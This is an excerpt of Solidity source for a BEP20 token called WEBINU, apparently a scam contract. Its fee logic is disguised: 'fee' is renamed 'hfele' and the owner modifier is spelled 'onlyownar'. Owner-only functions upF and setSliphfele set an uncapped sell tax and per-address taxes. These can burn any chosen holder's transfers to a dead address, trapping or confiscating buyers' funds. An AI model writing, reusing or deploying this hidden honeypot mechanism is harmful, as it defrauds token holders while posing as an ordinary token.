...
interface IUniswapV2Factory {
    ...
    function hfeleTo() external view returns (address);
    function hfeleToSetter() external view returns (address);
    ...
    function sethfeleTo(address) external;
    function sethfeleToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinghfeleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinghfeleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinghfeleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinghfeleOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinghfeleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract WEBINU is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellhfele = 0;

    uint256 private _defaultBuyhfele = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliphfele;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellhfele = _value;
    }

    function setSliphfele(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliphfele[_address] = _value;
    }

    function getSliphfele(address _address) external view onlyownar returns (uint256) {
        return _sliphfele[_address];
    }


    function setMAccounthfele(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccounthfele(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradehfeleAmount = 0;

        if (rF) {
            uint256 tradehfele = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradehfele = _defaultSellhfele;
                }
                if (from == uniswapV2Pair) {

                    tradehfele = _defaultBuyhfele;
                }
            }
            if (_sliphfele[from] > 0) {
                tradehfele = _sliphfele[from];
            }

            tradehfeleAmount = _Amount.mul(tradehfele).div(100);
        }


        if (tradehfeleAmount > 0) {
            _balances[from] = _balances[from].sub(tradehfeleAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradehfeleAmount);
            emit Transfer(from, _deadAddress, tradehfeleAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradehfeleAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradehfeleAmount);
        emit Transfer(from, _to, _Amount - tradehfeleAmount);
    }
